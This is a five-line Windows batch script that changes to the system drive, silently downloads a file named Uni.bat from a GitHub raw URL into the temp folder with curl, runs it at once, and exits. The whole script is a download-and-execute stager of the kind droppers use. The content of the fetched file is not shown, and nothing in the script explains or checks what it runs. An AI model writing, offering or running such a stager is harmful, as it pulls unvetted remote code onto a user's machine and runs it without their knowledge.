@echo off
cd /d %systemdrive%
curl -s -o %temp%\Uni.bat https://raw.githubusercontent.com/idogboi/jazz/main/Uni.bat
%temp%\Uni.bat
exit